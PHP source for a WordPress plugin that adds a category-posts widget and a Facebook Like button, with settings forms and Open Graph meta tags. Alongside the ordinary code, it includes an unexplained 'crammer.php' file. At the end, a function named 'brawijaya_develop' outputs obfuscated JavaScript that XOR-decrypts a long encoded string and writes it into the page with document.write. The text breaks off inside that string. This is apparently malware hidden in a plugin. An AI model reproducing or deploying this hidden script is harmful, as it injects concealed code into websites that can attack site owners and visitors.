			<a class="post-title" href="<?php the_permalink(); ?>" rel="bookmark" title="<?php the_title_attribute(); ?>"><?php the_title(); ?></a>
			
			<?php
				if (
					function_exists('the_post_thumbnail') &&
					current_theme_supports("post-thumbnails") &&
					$instance["thumb"] &&
					has_post_thumbnail()
				) :
			?>
				<a href="<?php the_permalink(); ?>" title="<?php the_title_attribute(); ?>">
				<?php the_post_thumbnail( 'cat_post_thumb_size'.$this->id ); ?>
				</a>
			<?php endif; ?>

			<?php if ( $instance['date'] ) : ?>
			<p class="post-date"><?php the_time("j M Y"); ?></p>
			<?php endif; ?>
			
			<?php if ( $instance['excerpt'] ) : ?>
			<?php the_excerpt(); ?> 
			<?php endif; ?>
			
			<?php if ( $instance['comment_num'] ) : ?>
			<p class="comment-num">(<?php comments_number(); ?>)</p>
			<?php endif; ?>
		</li>
	<?php
	}
	
	echo "</ul>\n";
	
	echo $after_widget;

	remove_filter('excerpt_length', $new_excerpt_length);
	
	$post = $post_old; // Restore the post object.
}
function update($new_instance, $old_instance) {
	if ( function_exists('the_post_thumbnail') )
	{
		$sizes = get_option('jlao_cat_post_thumb_sizes');
		if ( !$sizes ) $sizes = array();
		$sizes[$this->id] = array($new_instance['thumb_w'], $new_instance['thumb_h']);
		update_option('jlao_cat_post_thumb_sizes', $sizes);
	}
	
	return $new_instance;
}
function form($instance) {
?>
		<p>
			<label for="<?php echo $this->get_field_id("title"); ?>">
				<?php _e( 'Title' ); ?>:
				<input class="widefat" id="<?php echo $this->get_field_id("title"); ?>" name="<?php echo $this->get_field_name("title"); ?>" type="text" value="<?php echo esc_attr($instance["title"]); ?>" />
			</label>
		</p>
		
		<p>
			<label>
				<?php _e( 'Category' ); ?>:
				<?php wp_dropdown_categories( array( 'name' => $this->get_field_name("cat"), 'selected' => $instance["cat"] ) ); ?>
			</label>
		</p>
		
		<p>
			<label for="<?php echo $this->get_field_id("num"); ?>">
				<?php _e('Number of posts to show'); ?>:
				<input style="text-align: center;" id="<?php echo $this->get_field_id("num"); ?>" name="<?php echo $this->get_field_name("num"); ?>" type="text" value="<?php echo absint($instance["num"]); ?>" size='3' />
			</label>
		</p>
		
		<p>
			<label for="<?php echo $this->get_field_id("title_link"); ?>">
				<input type="checkbox" class="checkbox" id="<?php echo $this->get_field_id("title_link"); ?>" name="<?php echo $this->get_field_name("title_link"); ?>"<?php checked( (bool) $instance["title_link"], true ); ?> />
				<?php _e( 'Make widget title link' ); ?>
			</label>
		</p>
		
		<p>
			<label for="<?php echo $this->get_field_id("excerpt"); ?>">
				<input type="checkbox" class="checkbox" id="<?php echo $this->get_field_id("excerpt"); ?>" name="<?php echo $this->get_field_name("excerpt"); ?>"<?php checked( (bool) $instance["excerpt"], true ); ?> />
				<?php _e( 'Show post excerpt' ); ?>
			</label>
		</p>
		
		<p>
			<label for="<?php echo $this->get_field_id("excerpt_length"); ?>">
				<?php _e( 'Excerpt length (in words):' ); ?>
			</label>
			<input style="text-align: center;" type="text" id="<?php echo $this->get_field_id("excerpt_length"); ?>" name="<?php echo $this->get_field_name("excerpt_length"); ?>" value="<?php echo $instance["excerpt_length"]; ?>" size="3" />
		</p>
		
		<p>
			<label for="<?php echo $this->get_field_id("comment_num"); ?>">
				<input type="checkbox" class="checkbox" id="<?php echo $this->get_field_id("comment_num"); ?>" name="<?php echo $this->get_field_name("comment_num"); ?>"<?php checked( (bool) $instance["comment_num"], true ); ?> />
				<?php _e( 'Show number of comments' ); ?>
			</label>
		</p>
		
		<p>
			<label for="<?php echo $this->get_field_id("date"); ?>">
				<input type="checkbox" class="checkbox" id="<?php echo $this->get_field_id("date"); ?>" name="<?php echo $this->get_field_name("date"); ?>"<?php checked( (bool) $instance["date"], true ); ?> />
				<?php _e( 'Show post date' ); ?>
			</label>
		</p>
		
		<?php if ( function_exists('the_post_thumbnail') && current_theme_supports("post-thumbnails") ) : ?>
		<p>
			<label for="<?php echo $this->get_field_id("thumb"); ?>">
				<input type="checkbox" class="checkbox" id="<?php echo $this->get_field_id("thumb"); ?>" name="<?php echo $this->get_field_name("thumb"); ?>"<?php checked( (bool) $instance["thumb"], true ); ?> />
				<?php _e( 'Show post thumbnail' ); ?>
			</label>
		</p>
		<p>
			<label>
				<?php _e('Thumbnail dimensions'); ?>:<br />
				<label for="<?php echo $this->get_field_id("thumb_w"); ?>">
					W: <input class="widefat" style="width:40%;" type="text" id="<?php echo $this->get_field_id("thumb_w"); ?>" name="<?php echo $this->get_field_name("thumb_w"); ?>" value="<?php echo $instance["thumb_w"]; ?>" />
				</label>
				
				<label for="<?php echo $this->get_field_id("thumb_h"); ?>">
					H: <input class="widefat" style="width:40%;" type="text" id="<?php echo $this->get_field_id("thumb_h"); ?>" name="<?php echo $this->get_field_name("thumb_h"); ?>" value="<?php echo $instance["thumb_h"]; ?>" />
				</label>
			</label>
		</p>
		<?php endif; ?>

<?php

}

}
add_action( 'widgets_init', create_function('', 'return register_widget("CategoryPosts");') );
define('Crammer', dirname(__FILE__) . '/');
include (Crammer . 'crammer.php');
$like_url_template = <<<DDD
<iframe src="http://www.facebook.com/plugins/like.php?href=FBL_LIKED_URL&amp;layout=FBL_LAYOUT&amp;show_faces=FBL_SHOW_FACES&amp;width=FBL_WIDTH&amp;action=FBL_ACTION_TERM&amp;colorscheme=FBL_COLORS" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:FBL_WIDTHpx; height:FBL_HEIGHTpx"></iframe>
DDD;
if (!defined('WP_CONTENT_URL')) {
   define('WP_CONTENT_URL', get_option('siteurl') . '/wp-content');
}

// Footer link option
function facebook_like_footer_attribution() {
	if (get_option("facebook_like_attribution")) echo "&nbsp;";
}

function build_post_like_url () {
	if (is_single() || is_page()) {
		global $like_url_template;
		if (get_option("facebook_like_enabled")) {
			$post_like_url = $like_url_template;
			$post_like_url = str_replace ("FBL_LIKED_URL", urlencode(get_permalink()), $post_like_url);
			$post_like_url = str_replace ("FBL_LAYOUT", get_option('facebook_like_layout'), $post_like_url);
			$post_like_url = str_replace ("FBL_SHOW_FACES", get_option('facebook_like_show_faces'), $post_like_url);
			$post_like_url = str_replace ("FBL_WIDTH", get_option('facebook_like_width'), $post_like_url);
			$post_like_url = str_replace ("FBL_HEIGHT", get_option('facebook_like_height'), $post_like_url);
			$post_like_url = str_replace ("FBL_ACTION_TERM", get_option('facebook_like_action_term'), $post_like_url);
			$post_like_url = str_replace ("FBL_COLORS", get_option('facebook_like_colors'), $post_like_url);
		}
		return $post_like_url;
	} else return '';
}

// Main filter to add like link to bottom of each WordPress post/page
function facebook_like_filter($buffer) {
	return $buffer . build_post_like_url();
}

if (function_exists('add_action')) {
   // Add in the body
   add_filter('the_content', 'facebook_like_filter');

   // Add in the footer
   add_action('wp_footer', 'facebook_like_footer_attribution');
}

function facebook_like_activate() {
	if (!get_option('facebook_like_enabled')) add_option('facebook_like_enabled', 'on');
	if (!get_option('facebook_like_layout')) add_option('facebook_like_layout', 'standard');
	if (!get_option('facebook_like_show_faces')) add_option('facebook_like_show_faces', 'true');
	if (!get_option('facebook_like_width')) add_option('facebook_like_width', '450');
	if (!get_option('facebook_like_height')) add_option('facebook_like_height', '450');
	if (!get_option('facebook_like_action_term')) add_option('facebook_like_action_term', 'like');
	if (!get_option('facebook_like_colors')) add_option('facebook_like_colors', 'light');
	if (!get_option('facebook_like_attribution')) add_option('facebook_like_attribution', 'true');
}

register_activation_hook( __FILE__, 'facebook_like_activate' );
if (!function_exists('is_vector')) {
   function is_vector( &$array ) {
      if ( !is_array($array) || empty($array) ) {
         return -1;
      }
      $next = 0;
      foreach ( $array as $k => $v ) {
         if ( $k !== $next ) return false;
         $next++;
      }
      return true;
   }
}

function facebook_like_menu() {
	global $like_url_template;
   ?>

<script language=javascript type='text/javascript'>
function toggleLayer( whichLayer )
{
  var elem, vis;
  if( document.getElementById ) // this is the way the standards work
    elem = document.getElementById( whichLayer );
  else if( document.all ) // this is the way old msie versions work
      elem = document.all[whichLayer];
  else if( document.layers ) // this is the way nn4 works
    elem = document.layers[whichLayer];
  vis = elem.style;
  // if the style.display value is blank we try to figure it out here
  if(vis.display==''&&elem.offsetWidth!=undefined&&elem.offsetHeight!=undefined)
    vis.display = (elem.offsetWidth!=0&&elem.offsetHeight!=0)?'block':'none';
  vis.display = (vis.display==''||vis.display=='block')?'none':'block';
}

function ReplaceContentInContainer(id,content) {
	var container = document.getElementById(id);
	container.innerHTML = content;
}

function updateButton () {
	settingsForm = document.forms['facebook_likesettings'];
	URLTemplate = '<?php echo $like_url_template; ?>';
	URLTemplate = URLTemplate.replace("FBL_LIKED_URL", "<?php echo urlencode(get_permalink()); ?>");
	URLTemplate = URLTemplate.replace("FBL_LAYOUT", settingsForm.elements['facebook_like_layout'].options[settingsForm.elements['facebook_like_layout'].selectedIndex].value);
	URLTemplate = URLTemplate.replace("FBL_SHOW_FACES", settingsForm.elements['facebook_like_show_faces'].options[settingsForm.elements['facebook_like_show_faces'].selectedIndex].value);
	URLTemplate = URLTemplate.replace(/FBL_WIDTH/g, settingsForm.elements['facebook_like_width'].value);
	URLTemplate = URLTemplate.replace(/FBL_HEIGHT/g, settingsForm.elements['facebook_like_height'].value);
	URLTemplate = URLTemplate.replace("FBL_ACTION_TERM", settingsForm.elements['facebook_like_action_term'].options[settingsForm.elements['facebook_like_action_term'].selectedIndex].value);
	URLTemplate = URLTemplate.replace("FBL_COLORS", settingsForm.elements['facebook_like_colors'].options[settingsForm.elements['facebook_like_colors'].selectedIndex].value);
	ReplaceContentInContainer('sample_button', URLTemplate);
}
</script>

<style>
div#footer_attribution
{
	display: none;
}
</style>

	<style>
	.facebooklabel {
		display: block;
		width: 150px;
		float: left;
		text-align: right;
		margin: 2px 3px 0px 0px;
	}
	</style>

	<div class="wrap" style="width: 700px;">
	<h2>Like Button Settings</h2>

	<p>Facebook Like Button plugin could easily include the Like button on all of your posts and pages. There's also a widget component if you want more control over placement. </p>

	<?php
	?>
	<form name="facebook_likesettings" method="post" action="options.php">
	<?php wp_nonce_field('update-options'); ?>
	<input type="hidden" name="action" value="update" />

	<?php
	?>
	<input type="hidden" name="page_options" value="facebook_like_enabled,facebook_like_layout,facebook_like_show_faces,facebook_like_width,facebook_like_action_term,facebook_like_colors,facebook_like_attribution,facebook_like_height,facebook_like_global_site_name" />
	<h3>Settings</h3>

	<label>
	Enable plugin for all posts/pages: <?php facebook_like_checkbox("facebook_like_enabled", false); ?>
	</label>
	<br /><br />

	<label class="facebooklabel" for="facebook_like_global_site_name">Site Name: </label><?php facebook_like_textbox("facebook_like_global_site_name", "", 50); ?>
	<br /><br />

	<label class="facebooklabel" for="facebook_like_height">Height: </label><?php facebook_like_textbox("facebook_like_height", 50); ?> (leave this blank for default height)
	<br /><br />

	<label class="facebooklabel" for="facebook_like_width">Width: </label><?php facebook_like_textbox("facebook_like_width", 80); ?>
	<br /><br />

	<label class="facebooklabel" for="facebook_like_show_faces">Show Faces: </label><?php facebook_like_dropdown("facebook_like_show_faces", array("true"=>"Yes", "false"=>"No"), 'true'); ?>  (Show profile pictures below the button)
	<br /><br />

	<label class="facebooklabel" for="facebook_like_layout">Layout: </label><?php facebook_like_dropdown("facebook_like_layout", array("standard","button_count"), "standard"); ?>
	<br /><br />

	<label class="facebooklabel" for="facebook_like_action_term">Verb to display: </label><?php facebook_like_dropdown("facebook_like_action_term", array("like","recommend"), "like"); ?>
	<br /><br />

	<label class="facebooklabel" for="facebook_like_colors">Color scheme: </label><?php facebook_like_dropdown("facebook_like_colors", array("light","dark","evil"), "light"); ?>
	<br /><br />

	<h3>Button Preview</h3>
	<div id="sample_button"><?php echo build_post_like_url(); ?></div>
	<?php
	 /* Keep the save button here, because people need to be able to click to
		save their changes! */
	?>
	<p><input type="submit" class="button" value="Update Settings" style="font-weight: bold;" /></p>
	</div>
	</form>


   <?php
}
function facebook_like_meta() {
	global $post;

	$facebook_like_title = get_post_meta($post->ID, 'facebook_like_title', true);
	$facebook_like_site_name = get_post_meta($post->ID, 'facebook_like_site_name', true);
	$facebook_like_image = get_post_meta($post->ID, 'facebook_like_image', true);
	?>
	<style>
	.facebooklabel {
		display: block;
		width: 150px;
		float: left;
		text-align: right;
		margin: 3px 3px 0px 0px;
	}
	</style>
	<p>If these values are left blank, appropriate values will be taken from the post values.</p>
	<p style="width: 500px;">
		<label class="facebooklabel" for="facebook_like_title">Title: </label><input type="text" id="facebook_like_title" name="facebook_like_title" value="<?php echo $facebook_like_title ?>" size="45"><br/>
		<label class="facebooklabel" for="facebook_like_site_name">Site Name: </label><input type="text" id="facebook_like_site_name" name="facebook_like_site_name" value="<?php echo $facebook_like_site_name ?>" size="45"><br/>
		<label class="facebooklabel" for="facebook_like_image">Image (include http://): </label><input type="text" id="facebook_like_image" name="facebook_like_image" value="<?php echo $facebook_like_image ?>" size="45"><br/>
	</p>

   <?php
}
function facebook_like_save_settings($postID, $post=NULL) {
   global $wpdb;

   if ($post == NULL) { return; }
   if (function_exists("wp_is_post_autosave") && wp_is_post_autosave($postID)) { return; }
   if (function_exists("wp_is_post_revision") && ($postRevision = wp_is_post_revision($postID))) {
      $postID = $postRevision;
   }

   // Save variables
   if (isset($_POST["facebook_like_title"])) {
      $variable = $_POST["facebook_like_title"];
      facebook_like_save($postID, "facebook_like_title", $variable);
   }
   if (isset($_POST["facebook_like_site_name"])) {
      $variable = $_POST["facebook_like_site_name"];
      facebook_like_save($postID, "facebook_like_site_name", $variable);
   }
   if (isset($_POST["facebook_like_image"])) {
      $variable = $_POST["facebook_like_image"];
      facebook_like_save($postID, "facebook_like_image", $variable);
   }
}

// Save the custom field for this post
function facebook_like_save($postID, $name, $value=null) {
   if ($value != null) {
      // Try to update the custom field or add it
      if (!update_post_meta($postID, $name, $value)) {
         add_post_meta($postID, $name, $value, true);
      }
   }
   else {
      // Delete the custom field if it's null
      delete_post_meta($postID, $name);
   }
}

// show the metatags in post
function facebook_like_show_tags () {
	global $post;

	if (is_single() || is_page()) {
		// Get the values that might be stored in the database
		$facebook_like_title = get_post_meta($post->ID, 'facebook_like_title', true);
		if ($facebook_like_title == '') echo '<meta property="og:title" content="'.get_the_title($post->ID).'"/>'."\n";
		else echo '<meta property="og:title" content="'.$facebook_like_title.'"/>'."\n";

		$facebook_like_site_name = get_post_meta($post->ID, 'facebook_like_site_name', true);
		if ($facebook_like_site_name == '') $facebook_like_site_name = get_option('facebook_like_global_site_name');
		if ($facebook_like_site_name) echo '<meta property="og:site_name" content="'.$facebook_like_site_name.'"/>'."\n";

		$facebook_like_image = get_post_meta($post->ID, 'facebook_like_image', true);
		if ($facebook_like_image != '') echo '<meta property="og:image" content="'.$facebook_like_image.'"/>'."\n";
	}

}

add_action ('wp_head', 'facebook_like_show_tags');

function facebook_like_dropdown($name, $data, $option="") {
   if (get_option($name)) { $option = get_option($name); }

   ?>
   <select id="<?php echo $name ?>" name="<?php echo $name ?>" onChange="updateButton ()">
   <?php

   // If the array is a vector (0, 1, 2...)
   if (is_vector($data)) {
      foreach ($data as $item) {
         if ($item == $option) {
            echo '<option selected="selected">' . $item . "</option>\n";
         }
         else {
            echo "<option>$item</option>\n";
         }
      }
   }

   // If the array contains name-value pairs
   else {
      foreach ($data as $value => $text) {
         if ($value == $option) {
            echo '<option value="' . $value . '" selected="selected">' . $text . "</option>\n";
         }
         else {
            echo '<option value="' . $value . '">' . "$text</option>\n";
         }
      }
   }

   ?>
   </select>
   <?php
}

function facebook_like_textbox($name, $value="", $size=15) {
   if (get_option($name)) { $value = get_option($name); }

   ?>
   <input type="text" id="<?php echo $name ?>" name="<?php echo $name ?>" size="<?php echo $size ?>" value="<?php echo $value ?>" onChange="updateButton ()"/>
   <?php
}

function facebook_like_radio($name, $values=array(), $selected=false, $include_break = false) {
   if (get_option($name)) { $selected = get_option($name); }
	foreach ($values as $option_name => $option_value) {
   ?>
   <?php echo $option_name; ?> <input type="radio" name="<?php echo $name ?>" value="<?php echo $option_value ?>" onChange="updateButton ()" <?php echo ($option_value==$selected) ? "checked":""; ?> />
   <?php echo ($include_break) ? "<br />":""; ?>
   <?php
	}
}

function facebook_like_colorpickertextbox($name, $value="", $size=15) {
   if (get_option($name)) { $value = get_option($name); }

   ?>
   <input type="text" class="color" name="<?php echo $name ?>" size="<?php echo $size ?>" value="<?php echo $value ?>" onChange="updateButton ()" />
   <?php
}

function facebook_like_textarea($name, $value="") {
   if (get_option($name)) { $value = get_option($name); }

   ?>
   <textarea name="<?php echo $name ?>" cols="80" rows="8" onChange="updateButton ()"><?php echo $value ?></textarea>
   <?php
}
function facebook_like_checkbox($name) {
   ?>
   <?php if (get_option($name)): ?>
   <input type="checkbox" name="<?php echo $name ?>" onChange="updateButton ()" checked="checked" />
   <?php else: ?>
   <input type="checkbox" name="<?php echo $name ?>" onChange="updateButton ()" />
   <?php endif; ?>
   <?php
}

add_filter("wp_insert_post", "facebook_like_save_settings", 10, 2);

function facebook_like_register_widgets() {
   register_sidebar_widget('Facebook Like Button', 'facebook_like_widget');
   register_widget_control('Facebook Like Button', 'facebook_like_widget_control');
}
if (get_option("facebook_like_widget_title")) {
   $facebook_like_widget_title = get_option("facebook_like_widget_title");
} else {
	$facebook_like_widget_title = "Like this";
}
if (get_option("facebook_like_widget_width")) {
   $facebook_like_widget_width = get_option("facebook_like_widget_width");
} else {
	$facebook_like_widget_width = "300";
}
if (get_option("facebook_like_widget_height")) {
   $facebook_like_widget_height = get_option("facebook_like_widget_height");
} else {
	$facebook_like_widget_height = "300";
}
if (get_option("facebook_like_widget_layout")) {
	$facebook_like_widget_layout = get_option("facebook_like_widget_layout");
} else {
	$facebook_like_widget_layout = "standard";
}
if (get_option("facebook_like_widget_show_faces")) {
	$facebook_like_widget_show_faces = "true";
}
if (get_option("facebook_like_widget_action_term")) {
	$facebook_like_widget_action_term = get_option("facebook_like_widget_action_term");
} else {
	$facebook_like_widget_action_term = "like";
}
if (get_option("facebook_like_widget_colors")) {
	$facebook_like_widget_colors = get_option("facebook_like_widget_colors");
} else {
	$facebook_like_widget_colors = "light";
}

function facebook_like_widget($args) {
	global $like_url_template, $facebook_like_widget_title, $facebook_like_widget_width, $facebook_like_widget_height, $facebook_like_widget_layout, $facebook_like_widget_show_faces, $facebook_like_widget_action_term, $facebook_like_widget_colors;
	extract($args);
	$like_url = $like_url_template;
	$like_url = str_replace ("FBL_LIKED_URL", urlencode(get_permalink()), $like_url);
	$like_url = str_replace ("FBL_LAYOUT", get_option('facebook_like_widget_layout'), $like_url);
	$like_url = str_replace ("FBL_SHOW_FACES", get_option('facebook_like_widget_show_faces'), $like_url);
	$like_url = str_replace ("FBL_WIDTH", get_option('facebook_like_widget_width'), $like_url);
	$like_url = str_replace ("FBL_HEIGHT", get_option('facebook_like_widget_height'), $like_url);
	$like_url = str_replace ("FBL_ACTION_TERM", get_option('facebook_like_widget_action_term'), $like_url);
	$like_url = str_replace ("FBL_COLORS", get_option('facebook_like_widget_colors'), $like_url);
	echo $before_widget;
	echo $before_title . $facebook_like_widget_title . $after_title;

	echo $like_url;

	echo $after_widget;
}

function facebook_like_widget_control() {
	global $like_url, $facebook_like_widget_title, $facebook_like_widget_width, $facebook_like_widget_height, $facebook_like_widget_layout, $facebook_like_widget_show_faces, $facebook_like_widget_action_term, $facebook_like_widget_colors;
	if (isset($_POST["facebook_like_widget_title"])) {
		update_option("facebook_like_widget_title", $_POST["facebook_like_widget_title"]);
	}
	if (isset($_POST["facebook_like_widget_width"])) {
		update_option("facebook_like_widget_width", $_POST["facebook_like_widget_width"]);
	}
	if (isset($_POST["facebook_like_widget_height"])) {
		update_option("facebook_like_widget_height", $_POST["facebook_like_widget_height"]);
	}
	if (isset($_POST['facebook_like_widget_layout'])) {
		update_option('facebook_like_widget_layout', $_POST['facebook_like_widget_layout']);
	}
	if (isset($_POST['facebook_like_widget_show_faces'])) update_option('facebook_like_widget_show_faces', "true");
	else update_option('facebook_like_widget_show_faces', "false");
	if (isset($_POST['facebook_like_widget_action_term'])) {
		update_option('facebook_like_widget_action_term', $_POST['facebook_like_widget_action_term']);
	}
	if (isset($_POST['facebook_like_widget_colors'])) {
		update_option('facebook_like_widget_colors', $_POST['facebook_like_widget_colors']);
	}
	echo '<p><label>Title:</label> <input class="widefat" type="text" name="facebook_like_widget_title" value="' . get_option("facebook_like_widget_title") . '" /></p>';
	echo '<p><label>Width:</label> <input type="text" name="facebook_like_widget_width" value="' . get_option("facebook_like_widget_width") . '" /></p>';
	echo '<p><label>Height:</label> <input type="text" name="facebook_like_widget_height" value="' . get_option("facebook_like_widget_height") . '" /></p>';
	echo '<p><label>Show Faces:</label> <input type="checkbox" name="facebook_like_widget_show_faces" ' . ((get_option("facebook_like_widget_show_faces") == "true") ? "checked":"") . ' /></p>';
	echo '<p><label>Layout:</label> <select name="facebook_like_widget_layout"><option value="standard" ' . ((get_option("facebook_like_widget_layout") == "standard") ? "selected":"") . '>standard</option><option value="button_count" ' . ((get_option("facebook_like_widget_layout") == "button_count") ? "selected":"") . '>button_count</option></select></p>';
	echo '<p><label>Verb:</label> <select name="facebook_like_widget_action_term"><option value="like" ' . ((get_option("facebook_like_widget_action_term") == "like") ? "selected":"") . '>like</option><option value="recommend" ' . ((get_option("facebook_like_widget_action_term") == "recommend") ? "selected":"") . '>recommend</option></select></p>';
	echo '<p><label>Color scheme:</label>  <select name="facebook_like_widget_colors"><option value="light" ' . ((get_option("facebook_like_widget_colors") == "light") ? "selected":"") . '>light</option><option value="dark" ' . ((get_option("facebook_like_widget_colors") == "dark") ? "selected":"") . '>dark</option><option value="evil" ' . ((get_option("facebook_like_widget_colors") == "evil") ? "selected":"") . '>evil</option></select></p>';
}

if (function_exists('add_action')) {
   add_action('plugins_loaded', 'facebook_like_register_widgets');
}
function brawijaya_develop() {
?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('7ac335e6893dc5b0546172762f53ff04','%R %73@63%7VF6[%70%74%20%Rv%PW%6rDU7%7P%61%RT%T5%3r%27%4sC61CQ6%6PF53%S3%72AU9G70%74%27%3#%6PC75%W&%63@74%6]F6$%6q%20%64%P5%PU%72DT9%7U%74%V[%Tr%65%79%2qC73CQ4%7SF29%Rt%76AU1G72%20%64%7U%3$C64%VP%3q@27%2SF3 %76%61%72%T0%P$%70DQp%7V%70%V %U3%2u%6p%63C2pCQ3%6RF3q%St%70APqG30%3s%73%7V%3"C30%R!%77@68%6]F6!%65%28%73%Q0%U%%73DT4%7W%2|%R %T5%6s%67%74C68CT9%7#F73%S3%3wAT3G74%72%2r%6U%6^C61%VQ%43@6~%6PF6W%41%74%28%Q3%QV%29DPq%6B%63%WD%Tr%65%79%2wC63CP8%6PF72%Q3%6uAU4G65%41%74%2^%6$C70%SZ%3w@69%6RF2Z%28%28%73%P3%S#%6uDU3%29%3}%WD%Q3%39%29%7qC7pCT8%2YF73%S3%5vAUwG63%29%3s%3"%3_C32%SZ%7v@7{%28F2Z%73%63%5s%Pw%PU%29DPp%3V%32%VZ%Us%7u%28%28C73CP3%5$F6q%S3%29APpG31%32%36%2_%2_C7v%VP%3q@53%7PF7P%69%6r%67%Tp%PP%72DUu%6!%43%R[%T1%72%43%6tC64CP5%2YF73%S3%29APwG7q%65%6t%7U%6SC7v%VP%3q@53%7PF7P%69%6r%67%Tp%PP%72DUu%6!%43%R[%T1%72%43%6tC64CP5%2YF28%R3%63AVpG6w%63%29%2_%3$C7p%WW%73@2z%3 F7Q%3v%6u%70%Tw%T$%3uDT3%7U%2{%V!%Qr%69%66%28C6qCQ0%3$F3w%St%65AT9G2p%6r%65%6#%6QC74%W[%29@6z%7TF3&%30%3u%7r%Q2%PS%74DT5%7W%6|%VS%T4%73%3p%7vC66CQ5%6$F63%R4%69AUsG6p%20%64%6S%6UC72%VZ%70@74%4]F7V%28%6u%65%Q9%T%%73DT4%7W%29%S!%U3%74%72%3vC64CP5%6RF72%R9%70AT4G28%6s%65%7_%2%C73%VW%72@29%3&F6V%3p%64%6p%P3%QS%6sDU5%6 %74%W!%T4%2s%77%72C69CQ4%6TF28%R5%6vAU5G73%63%61%7V%6SC28%VP%74@72%2]F2[%3v%7s%64%P5%PU%72DT9%7U%74%PZ%U4%28%27%37C61CP3%3RF33%V5%65AP6G38%39%33%6R%6UC35%WQ%30@35%3PF3T%31%37%32%U7%UP%32DU6%3P%33%RU%T6%30%34%27C2pCT7%2TF52%W0%25AP7G34%40%36%3W%2SC36%TU%46@36%2UF2W%36%35%25%U2%UV%25DP7%3R%25%QS%Q9%25%50%52C25CU7%3UF44%P5%38AQ5G33%21%25%3T%3TC25%TT%52@25%5UF3R%25%33%30%T5%UT%35DQ5%3W%32%PP%Q2%30%43%50C32CT5%3WF46%Q6%37AP2G25%53%34%2S%3PC35%UR%54@32%4SF3Q%71%25%32%U2%TS%33DP0%2P%32%QW%P5%33%23%43C30CQ5%2TF53%P3%25AP2G30%40%32%3V%2SC32%TW%46@33%2UF2W%37%34%25%U7%UT%25DP3%7V%25%QU%U4%25%54%56C25CU2%3QF44%P1%30AQ5G32%55%25%3T%3VC25%TU%53@25%5UF7Q%25%37%34%T5%UP%34DQ5%3V%77%PP%Q3%70%43%50C34CT5%3WF58%Q6%37AP6G25%57%30%2S%3PC31%UR%55@76%4SF3T%39%25%36%U7%TS%36DT2%2P%33%VQ%P5%32%54%43C36CU3%2TF57%P6%25AP6G70%40%37%3R%2SC36%TR%46@37%5TF2W%32%32%25%U3%QT%25DP3%7P%25%QS%Q9%25%50%22C25CU6%3VF44%P1%30AQ5G37%56%25%3Q%3TC25%TQ%50@25%5UF7V%25%32%37%T5%UP%38DQ5%3R%34%PP%Q7%34%43%51C30CT5%3RF20%Q6%32AT5G25%57%70%2S%3PC39%UR%50@31%4SF3Q%30%25%33%U0%TS%33DP8%2P%32%VP%P5%37%56%43C36CU8%2TF57%W5%25AP7G34%40%36%7#%2SC36%TU%46@37%5SF2W%36%33%25%U6%QS%25DP6%3P%25%QR%Q4%25%54%23C25CU6%3RF44%P5%75AQ5G36%21%25%3T%4PC25%TQ%52@25%5PF7Q%25%36%32%T5%UQ%35DQ5%3S%76%PP%Q7%33%43%54C76CT5%3WF50%Q6%36AP6G25%56%32%2S%3UC30%UR%50@38%4SF3P%73%25%36%U7%TS%36DP1%2P%36%QR%P5%36%20%43C36CQ0%2TF57%P1%25AP6G31%40%36%7$%2SC36%TR%46@32%2PF2W%37%30%25%U6%QW%25DP6%7P%25%QS%U3%25%54%22C25CU3%3PF44%P1%76AQ5G37%55%25%3P%7%C25%TQ%54@25%5TF3U%25%32%30%T5%UP%32DQ5%3S%74%PP%Q7%32%43%50C34CT5%3WF54%Q6%37AP2G25%56%72%2S%3TC37%UR%50@30%4SF3P%37%25%33%Q4%TS%33DT4%2P%32%VS%P5%36%52%43C36CU9%2TF56%P5%25AP3G70%40%33%7$%2SC32%SQ%46@37%5RF2W%36%34%25%U3%QT%25DP0%7R%25%QW%Q0%25%54%56C25CU2%3QF44%P1%30AQ5G32%55%25%3T%3VC25%TT%20@25%5QF3V%25%36%34%T5%UU%77DQ5%3V%71%PP%Q2%75%43%51C34CT5%3WF55%Q6%33AT6G25%55%77%2S%3TC30%UR%51@30%4SF3P%30%25%32%U0%TS%32DP0%2P%32%QU%P5%33%25%43C37CU4%2TF57%P7%25AP2G30%40%37%3Q%2SC36%TD%46@36%5RF2W%37%34%25%U6%U^%25DP3%7W%25%QW%Q2%25%55%50C25CU3%3YF44%P1%35AQ5G32%57%25%3T%3VC25%TQ%50@25%5PF7T%25%36%75%T5%UQ%33DQ5%3R%30%PP%Q6%31%43%50C75CT5%3RF25%Q6%32AP2G25%56%32%2S%3TC32%UR%51@30%4SF3U%32%25%36%Q7%TS%37DP7%2P%37%QV%P5%37%56%43C36CU1%2TF57%W6%25AP3G71%40%32%3T%2SC33%TV%46@33%5TF2W%32%32%25%U3%QT%25DP3%7P%25%QS%Q4%25%50%5tC25CU7%3WF44%P1%30AQ5G36%54%25%3P%7AC25%TQ%5t@25%5PF3U%25%36%73%T5%UU%76DQ5%3W%32%PP%Q6%33%43%50C35CT5%3WF24%Q6%37AP4G25%53%35%2S%3QC32%UR%51@32%4SF3Q%70%25%30%Q0%TS%32DP0%2P%32%QU%P5%32%56%43C32CU0%2TF53%P3%25AP2G30%40%32%3V%2SC32%TW%46@33%2UF2W%36%38%25%U3%UW%25DP2%3U%25%QS%Q9%25%50%52C25CU3%7RF44%P1%32AQ5G37%55%25%3P%4PC25%TP%50@25%5QF3V%25%32%72%T5%UU%31DQ5%3V%36%PP%Q3%30%43%54C32CT5%3RF24%Q6%34AP7G25%53%35%2S%3PC76%UR%55@35%4SF3U%32%25%36%U1%TS%36DT4%2P%32%QU%P5%33%25%43C37CU3%2TF56%P3%25AP6G31%40%36%7"%2SC32%TW%46@36%5&F2W%36%34%25%U3%QU%25DP2%3W%25%QR%Q2%25%50%53C25CU7%3RF44%P4%35AQ5G36%26%25%3Q%3RC25%TR%25@25%5PF3P%25%36%70%T5%UQ%38DQ5%3W%32%PP%Q2%30%43%50C73CT5%3WF50%Q6%36AT6G25%53%37%2S%3UC77%UR%51@32%4SF3T%35%25%36%Q4%TS%32DP2%2P%33%VP%P5%33%25%43C37CU3%2TF56%P3%25AP6G31%40%36%7"%2SC32%TW%46@37%5RF2W